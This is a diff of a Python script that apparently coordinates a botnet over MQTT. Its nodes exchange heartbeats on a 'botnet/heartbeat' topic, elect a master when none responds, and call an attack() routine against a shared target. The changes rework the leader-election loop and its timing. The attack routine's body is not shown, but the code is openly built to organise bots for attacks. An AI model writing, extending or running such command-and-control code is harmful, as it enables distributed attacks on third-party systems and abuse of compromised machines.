@@ -39,6 +39,8 @@ def on_messagesc(client, userdata, msg):
         print("Target/Id",inp[0],inp[1])
         topic=str(msg.topic)
         print(" ")
+        if(int(inp[1])<lastId):
+            nodeId=nodeId-(lastId-int(inp[1]))
         if(topic=="botnet/heartbeat" and lastId!=int(inp[1])):
             lastId=int(inp[1])
             print("New local last id:",lastId)
@@ -54,6 +56,9 @@ def isSlave():
     return nodeId==1
 def isReceived():
     return received==1
+def noReceived():
+    global received
+    received=0
 def attack():
     global target
     startTime=time.time()
@@ -69,7 +74,7 @@ def attack():
         #delay
 
 def slave():
-    global client,nodeId
+    global client,nodeId,received
     print("I'm slave")
     client.on_connect = on_connectsc
     client.on_message = on_messagesc
@@ -77,13 +82,23 @@ def slave():
     client.connect(broker,port)
     startTime=time.time()
     time.sleep(1)
-    while(nodeId==1):
-        client.loop(.1)
+    while(True):#nodeId==1):
+        client.loop(2)
         if(int((time.time()-startTime)%60%2)==0):
             startTime=time.time()
+            print("If slave")
             if (not isReceived()):
                 nodeId-=1
+                lastId=0
+                print("norec")
                 master()
+            else:
+                
+                print("rec0")
+                time.sleep(1)
+                print("Postsleep")
+                noReceived()
+            
 def master():
     global client,nodeId,lastId
     print("No alive nodes, i'll be the master one")
@@ -104,11 +119,11 @@ def master():
         client.loop(.1)
         if(int((time.time()-startTime)%60%1)==0):
             startTime=time.time()
-            time.sleep(1)
-            ret= client.publish("botnet/heartbeat",heartbeat())
-            
+            time.sleep(.7)
+            ret= client.publish("botnet/heartbeat",heartbeat())            
             print("Last id:",lastId)
             print(ret)
+            
 def common():
     global client, nodeId, lastId
     def setNodeId(newLastId):
@@ -124,7 +139,7 @@ def common():
     startTime=time.time()
     time.sleep(1)
     while(True):
-        client.loop(.1)
+        client.loop(14)
         #print("Mi id",nodeId)
         if(int((time.time()-startTime)%60%14)==0):
             time.sleep(1)## 15 seconds elapsed
